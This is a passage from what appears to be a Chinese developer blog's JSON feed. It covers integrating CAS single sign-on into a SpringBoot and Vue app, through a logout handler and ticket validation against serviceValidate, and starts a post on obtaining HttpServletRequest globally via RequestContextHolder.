data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">TokenService</span> tokenService<span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token annotation punctuation\">@Value</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"$&#123;cas.server-host-url&#125;\"</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> casServerHostUrl<span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token annotation punctuation\">@Value</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"$&#123;cas.client-host-url&#125;\"</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> casClientHostUrl<span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token comment\">/**  </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>     * 退出处理  </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>     *  </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>     * @return  </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>     */</span>  </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span>  </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token annotation punctuation\">@SneakyThrows</span>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">onLogoutSuccess</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span> request<span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpServletResponse</span> response<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Authentication</span> authentication<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token class-name\">CasUserInfo</span> casUserInfo<span class=\"token operator\">=</span>tokenService<span class=\"token punctuation\">.</span><span class=\"token function\">getCasUser</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">ObjectUtils</span><span class=\"token punctuation\">.</span><span class=\"token function\">isNotEmpty</span><span class=\"token punctuation\">(</span>casUserInfo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token comment\">// 删除用户缓存记录  </span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            tokenService<span class=\"token punctuation\">.</span><span class=\"token function\">delLoginUser</span><span class=\"token punctuation\">(</span>casUserInfo<span class=\"token punctuation\">.</span><span class=\"token function\">getToken</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token class-name\">String</span> url <span class=\"token operator\">=</span> casServerHostUrl <span class=\"token operator\">+</span> <span class=\"token string\">\"/logout?service=\"</span> <span class=\"token operator\">+</span> casClientHostUrl<span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token class-name\">JSONObject</span> jsonObject <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">JSONObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        jsonObject<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"logoutUrl\"</span><span class=\"token punctuation\">,</span> url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token class-name\">ServletUtils</span><span class=\"token punctuation\">.</span><span class=\"token function\">renderString</span><span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">,</span> <span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">toJSONString</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Result</span><span class=\"token punctuation\">.</span><span class=\"token function\">success</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"退出成功\"</span><span class=\"token punctuation\">,</span>jsonObject<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\">//        response.sendRedirect(this.casServerHostUrl + \"/logout?service=\" + this.casClientHostUrl);  </span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h1 id=\"5-前端工作\"><a class=\"anchor\" href=\"#5-前端工作\">#</a> 5. 前端工作</h1>\n<p>前端需要做的是，根据后端返回的 json 跳转到登录页面，还有将登录成功后得到的 ticket 传给后端，以及从 cookie 里拿 token 并放在 header 里面。</p>\n<h1 id=\"二-servicevalidate配置\"><a class=\"anchor\" href=\"#二-servicevalidate配置\">#</a> 二、serviceValidate 配置</h1>\n<p>这种方式就是直接去请求 CAS Server 提供的一个票据验证的接口，后端这边没啥要做的，就是请求接口，解析返回的 xml 数据，并且给前端一个 token 即可。这边直接拿 JeecgBoot 里面的代码看一下。</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token annotation punctuation\">@Slf4j</span>  </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token annotation punctuation\">@RestController</span>  </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token annotation punctuation\">@RequestMapping</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/sys/cas/client\"</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">CasClientController</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>   <span class=\"token annotation punctuation\">@Autowired</span>  </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>   <span class=\"token keyword\">private</span> <span class=\"token class-name\">ISysUserService</span> sysUserService<span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>   <span class=\"token annotation punctuation\">@Autowired</span>  </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">ISysDepartService</span> sysDepartService<span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>   <span class=\"token annotation punctuation\">@Autowired</span>  </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">RedisUtil</span> redisUtil<span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>   <span class=\"token annotation punctuation\">@Value</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"$&#123;cas.prefixUrl&#125;\"</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> prefixUrl<span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>   <span class=\"token annotation punctuation\">@GetMapping</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/validateLogin\"</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>   <span class=\"token keyword\">public</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">validateLogin</span><span class=\"token punctuation\">(</span><span class=\"token annotation punctuation\">@RequestParam</span><span class=\"token punctuation\">(</span>name<span class=\"token operator\">=</span><span class=\"token string\">\"ticket\"</span><span class=\"token punctuation\">)</span> <span class=\"token class-name\">String</span> ticket<span class=\"token punctuation\">,</span>  </pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                        <span class=\"token annotation punctuation\">@RequestParam</span><span class=\"token punctuation\">(</span>name<span class=\"token operator\">=</span><span class=\"token string\">\"service\"</span><span class=\"token punctuation\">)</span> <span class=\"token class-name\">String</span> service<span class=\"token punctuation\">,</span>  </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                        <span class=\"token class-name\">HttpServletRequest</span> request<span class=\"token punctuation\">,</span>  </pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                        <span class=\"token class-name\">HttpServletResponse</span> response<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"22\"></td><td><pre>      <span class=\"token class-name\">Result</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">JSONObject</span><span class=\"token punctuation\">></span></span> result <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Result</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      log<span class=\"token punctuation\">.</span><span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Rest api login.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"24\"></td><td><pre>      <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"25\"></td><td><pre>         <span class=\"token class-name\">String</span> validateUrl <span class=\"token operator\">=</span> prefixUrl<span class=\"token operator\">+</span><span class=\"token string\">\"/p3/serviceValidate\"</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"26\"></td><td><pre>         <span class=\"token class-name\">String</span> res <span class=\"token operator\">=</span> <span class=\"token class-name\">CasServiceUtil</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStValidate</span><span class=\"token punctuation\">(</span>validateUrl<span class=\"token punctuation\">,</span> ticket<span class=\"token punctuation\">,</span> service<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"27\"></td><td><pre>         log<span class=\"token punctuation\">.</span><span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"res.\"</span><span class=\"token operator\">+</span>res<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"28\"></td><td><pre>         <span class=\"token keyword\">final</span> <span class=\"token class-name\">String</span> error <span class=\"token operator\">=</span> <span class=\"token class-name\">XmlUtils</span><span class=\"token punctuation\">.</span><span class=\"token function\">getTextForElement</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">,</span> <span class=\"token string\">\"authenticationFailure\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"29\"></td><td><pre>         <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">StringUtils</span><span class=\"token punctuation\">.</span><span class=\"token function\">isNotEmpty</span><span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"30\"></td><td><pre>            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Exception</span><span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"31\"></td><td><pre>         <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"32\"></td><td><pre>         <span class=\"token keyword\">final</span> <span class=\"token class-name\">String</span> principal <span class=\"token operator\">=</span> <span class=\"token class-name\">XmlUtils</span><span class=\"token punctuation\">.</span><span class=\"token function\">getTextForElement</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">,</span> <span class=\"token string\">\"user\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"33\"></td><td><pre>         <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">StringUtils</span><span class=\"token punctuation\">.</span><span class=\"token function\">isEmpty</span><span class=\"token punctuation\">(</span>principal<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"34\"></td><td><pre>               <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Exception</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"No principal was found in the response from the CAS server.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"35\"></td><td><pre>           <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"36\"></td><td><pre>         log<span class=\"token punctuation\">.</span><span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"-------token----username---\"</span><span class=\"token operator\">+</span>principal<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"37\"></td><td><pre>          <span class=\"token comment\">//1. 校验用户是否有效  </span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>         <span class=\"token class-name\">SysUser</span> sysUser <span class=\"token operator\">=</span> sysUserService<span class=\"token punctuation\">.</span><span class=\"token function\">getUserByName</span><span class=\"token punctuation\">(</span>principal<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"39\"></td><td><pre>         result <span class=\"token operator\">=</span> sysUserService<span class=\"token punctuation\">.</span><span class=\"token function\">checkUserIsEffective</span><span class=\"token punctuation\">(</span>sysUser<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"40\"></td><td><pre>         <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>result<span class=\"token punctuation\">.</span><span class=\"token function\">isSuccess</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"41\"></td><td><pre>            <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"42\"></td><td><pre>         <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"43\"></td><td><pre>         <span class=\"token class-name\">String</span> token <span class=\"token operator\">=</span> <span class=\"token class-name\">JwtUtil</span><span class=\"token punctuation\">.</span><span class=\"token function\">sign</span><span class=\"token punctuation\">(</span>sysUser<span class=\"token punctuation\">.</span><span class=\"token function\">getUsername</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> sysUser<span class=\"token punctuation\">.</span><span class=\"token function\">getPassword</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"44\"></td><td><pre>         <span class=\"token comment\">// 设置超时时间  </span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>         redisUtil<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">CommonConstant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">PREFIX_USER_TOKEN</span> <span class=\"token operator\">+</span> token<span class=\"token punctuation\">,</span> token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"46\"></td><td><pre>         redisUtil<span class=\"token punctuation\">.</span><span class=\"token function\">expire</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">CommonConstant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">PREFIX_USER_TOKEN</span> <span class=\"token operator\">+</span> token<span class=\"token punctuation\">,</span> <span class=\"token class-name\">JwtUtil</span><span class=\"token punctuation\">.</span><span class=\"token constant\">EXPIRE_TIME</span><span class=\"token operator\">*</span><span class=\"token number\">2</span> <span class=\"token operator\">/</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"47\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"48\"></td><td><pre>         <span class=\"token comment\">// 获取用户部门信息  </span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>         <span class=\"token class-name\">JSONObject</span> obj <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">JSONObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"50\"></td><td><pre>         <span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">SysDepart</span><span class=\"token punctuation\">></span></span> departs <span class=\"token operator\">=</span> sysDepartService<span class=\"token punctuation\">.</span><span class=\"token function\">queryUserDeparts</span><span class=\"token punctuation\">(</span>sysUser<span class=\"token punctuation\">.</span><span class=\"token function\">getId</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"51\"></td><td><pre>         obj<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"departs\"</span><span class=\"token punctuation\">,</span> departs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"52\"></td><td><pre>         <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>departs <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span> <span class=\"token operator\">||</span> departs<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"53\"></td><td><pre>            obj<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"multi_depart\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"54\"></td><td><pre>         <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>departs<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"55\"></td><td><pre>            sysUserService<span class=\"token punctuation\">.</span><span class=\"token function\">updateUserDepart</span><span class=\"token punctuation\">(</span>principal<span class=\"token punctuation\">,</span> departs<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getOrgCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"56\"></td><td><pre>            obj<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"multi_depart\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"57\"></td><td><pre>         <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"58\"></td><td><pre>            obj<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"multi_depart\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"59\"></td><td><pre>         <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"60\"></td><td><pre>         obj<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"token\"</span><span class=\"token punctuation\">,</span> token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"61\"></td><td><pre>         obj<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"userInfo\"</span><span class=\"token punctuation\">,</span> sysUser<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"62\"></td><td><pre>         result<span class=\"token punctuation\">.</span><span class=\"token function\">setResult</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"63\"></td><td><pre>         result<span class=\"token punctuation\">.</span><span class=\"token function\">success</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"登录成功\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"64\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"65\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"66\"></td><td><pre>         <span class=\"token comment\">//e.printStackTrace();  </span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>         result<span class=\"token punctuation\">.</span><span class=\"token function\">error500</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span><span class=\"token function\">getMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"68\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"69\"></td><td><pre>      <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HttpEntity</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"70\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"71\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"72\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"73\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>需要注意的一点是，不同协议的票据验证地址是不一样的，比如 CAS3.0 的是 /p3/serviceValiate，CAS2.0 的则没有前面的 p3，而 1.0 的地址则是 /validate，并且接收的参数和返回的结构也有一些差别。</p>\n",
            "tags": [
                "笔记",
                "SpringBoot",
                "Vue",
                "CAS",
                "单点登录",
                "前后端分离"
            ]
        },
        {
            "id": "https://a1oyss.github.io/%E7%AC%94%E8%AE%B0/%E5%85%A8%E5%B1%80%E8%8E%B7%E5%8F%96HttpServletRequest%E7%9A%84%E5%8E%9F%E7%90%86/",
            "url": "https://a1oyss.github.io/%E7%AC%94%E8%AE%B0/%E5%85%A8%E5%B1%80%E8%8E%B7%E5%8F%96HttpServletRequest%E7%9A%84%E5%8E%9F%E7%90%86/",
            "title": "如何从全局获取HttpServletRequest",
            "date_published": "2022-11-28T12:07:22.000Z",
            "content_html": "<p>#源码<br />\n这几天写项目，有分页需求，每个接口上定义一次参数有点麻烦，就想到 RuoYi 写了个 <code>getPageDomain</code>  的静态方法，其原理是直接通过 <code>HttpServletRequest</code>  对象获取 url 中的参数。</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">PageDomain</span> <span class=\"token function\">getPageDomain</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token class-name\">PageDomain</span> pageDomain <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">PageDomain</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    pageDomain<span class=\"token punctuation\">.</span><span class=\"token function\">setPageNum</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Convert</span><span class=\"token punctuation\">.</span><span class=\"token function\">toInt</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ServletUtils</span><span class=\"token punctuation\">.</span><span class=\"token function\">getParameter</span><span class=\"token punctuation\">(</span><span class=\"token constant\">PAGE_NUM</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    pageDomain<span class=\"token punctuation\">.</span><span class=\"token function\">setPageSize</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Convert</span><span class=\"token punctuation\">.</span><span class=\"token function\">toInt</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ServletUtils</span><span class=\"token punctuation\">.</span><span class=\"token function\">getParameter</span><span class=\"token punctuation\">(</span><span class=\"token constant\">PAGE_SIZE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    pageDomain<span class=\"token punctuation\">.</span><span class=\"token function\">setOrderByColumn</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ServletUtils</span><span class=\"token punctuation\">.</span><span class=\"token function\">getParameter</span><span class=\"token punctuation\">(</span><span class=\"token constant\">ORDER_BY_COLUMN</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    pageDomain<span class=\"token punctuation\">.</span><span class=\"token function\">setIsAsc</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ServletUtils</span><span class=\"token punctuation\">.</span><span class=\"token function\">getParameter</span><span class=\"token punctuation\">(</span><span class=\"token constant\">IS_ASC</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    pageDomain<span class=\"token punctuation\">.</span><span class=\"token function\">setReasonable</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ServletUtils</span><span class=\"token punctuation\">.</span><span class=\"token function\">getParameterToBool</span><span class=\"token punctuation\">(</span><span class=\"token constant\">REASONABLE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">return</span> pageDomain<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>其中 <code>ServletUtils</code>  中封装了获取请求参数的方法，那么为了在每次请求都能拿到正确的参数，就必须先获取到 <code>HttpServletRequest</code> ， <code>ServletUtils</code>  的做法是通过 <code>RequestContextHolder</code>  来获取</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">String</span> <span class=\"token 